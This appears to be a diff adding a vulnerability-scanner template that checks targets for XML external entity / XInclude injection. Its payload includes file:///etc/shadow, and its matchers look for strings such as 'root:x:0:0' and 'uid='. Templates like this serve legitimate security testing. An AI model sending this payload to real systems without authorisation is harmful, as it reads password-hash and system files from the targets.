@@ -1,0 +1,25 @@
+id: xxe5-0183
+name: 'XXE read in node'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via node'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      node:
+        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/shadow"/></r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
